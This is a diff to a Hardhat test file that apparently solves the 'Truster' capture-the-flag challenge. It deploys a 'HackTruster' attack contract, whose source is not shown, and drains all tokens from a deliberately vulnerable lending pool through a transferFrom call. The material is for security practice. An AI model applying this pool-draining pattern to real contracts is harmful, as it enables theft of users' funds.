@@ -23,18 +23,25 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        hackContract = await (await ethers.getContractFactory('HackTruster', deployer)).deploy(pool.address, token.address);
+        await expect(
+            hackContract.connect(player).hack(TOKENS_IN_POOL)
+        ).not.to.be.reverted;
+
+        await expect(
+            token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
+        ).not.to.be.reverted;
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-
+        expect(
+            await token.balanceOf(pool.address)
+        ).to.equal(0);
         // Player has taken all tokens from the pool
         expect(
             await token.balanceOf(player.address)
         ).to.equal(TOKENS_IN_POOL);
-        expect(
-            await token.balanceOf(pool.address)
-        ).to.equal(0);
     });
 });
 
